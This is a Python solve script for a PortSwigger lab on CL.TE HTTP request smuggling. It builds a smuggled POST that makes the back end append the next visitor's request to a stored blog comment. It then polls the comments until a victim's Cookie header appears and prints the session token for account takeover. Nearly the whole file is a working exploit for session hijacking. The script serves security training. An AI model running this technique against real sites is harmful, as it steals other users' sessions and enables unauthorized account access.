#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to capture other users' requests (CL.TE).

Sends a CL.TE smuggling request that leaves the back-end waiting for bytes.
The next victim request gets appended to the comment body and stored.
Script polls the comment thread until a Cookie header is found.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def grab_csrf(session: requests.Session, lab: str, post_id: int) -> str:
    r = session.get(f"{lab}/post?postId={post_id}")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found in comment form")
    return m.group(1)


def build_smuggled_body(lab_host: str, session_cookie: str, csrf: str,
                        post_id: int, inner_cl: int) -> bytes:
    inner_body = (
        f"csrf={csrf}&postId={post_id}&name=test&email=test@test.com"
        f"&website=&comment="
    )
    inner_request = (
        f"POST /post/comment HTTP/1.1\r\n"
        f"Host: {lab_host}\r\n"
        f"Cookie: session={session_cookie}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {inner_cl}\r\n"
        f"\r\n"
        f"{inner_body}"
    )
    chunk_body = f"0\r\n\r\n{inner_request}"
    return chunk_body.encode()


def send_smuggle(session: requests.Session, lab: str, lab_host: str,
                 session_cookie: str, csrf: str, post_id: int,
                 inner_cl: int) -> None:
    body = build_smuggled_body(lab_host, session_cookie, csrf, post_id, inner_cl)
    outer_cl = len(body)
    headers = {
        "Host": lab_host,
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(outer_cl),
        "Transfer-Encoding": "chunked",
    }
    try:
        session.post(lab + "/", headers=headers, data=body, timeout=10)
    except requests.exceptions.Timeout:
        pass


def get_comments(session: requests.Session, lab: str, post_id: int) -> list[str]:
    r = session.get(f"{lab}/post?postId={post_id}")
    return re.findall(r'<p class="comment-body">(.*?)</p>', r.text, re.DOTALL)


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 9 (capture other users' requests)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session_cookie", help="Your session cookie value")
    parser.add_argument("--post-id", type=int, default=1, help="Blog post ID to comment on")
    parser.add_argument("--inner-cl", type=int, default=800,
                        help="Inner Content-Length (increase if Cookie truncated)")
    parser.add_argument("--attempts", type=int, default=20,
                        help="Max smuggle attempts before giving up")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    lab_host = lab.split("//", 1)[1]
    s = requests.Session()
    s.verify = False

    seen_comments: set[str] = set()

    # Seed seen comments so we only look at new ones
    for c in get_comments(s, lab, args.post_id):
        seen_comments.add(c)

    print(f"[*] Starting smuggle loop (up to {args.attempts} attempts)...")
    for attempt in range(1, args.attempts + 1):
        csrf = grab_csrf(s, lab, args.post_id)
        print(f"[{attempt}] Sending smuggle with inner CL={args.inner_cl}")
        send_smuggle(s, lab, lab_host, args.session_cookie, csrf,
                     args.post_id, args.inner_cl)
        time.sleep(1)

        for c in get_comments(s, lab, args.post_id):
            if c in seen_comments:
                continue
            seen_comments.add(c)
            if "Cookie:" in c:
                m = re.search(r"Cookie:\s*([^\r\n<]+)", c)
                if m:
                    print(f"\n[+] Captured request with Cookie header!")
                    print(f"[+] Cookie line: {m.group(1)}")
                    session_m = re.search(r"session=([A-Za-z0-9]+)", m.group(1))
                    if session_m:
                        print(f"\n[+] Victim session: {session_m.group(1)}")
                        print("[+] Use this cookie in your browser to access /my-account")
                    return
            else:
                print(f"[*] New comment captured (no Cookie yet — increase --inner-cl):\n{c[:300]}")

    print("[-] No victim cookie captured. Try increasing --inner-cl or --attempts.")


if __name__ == "__main__":
    main()
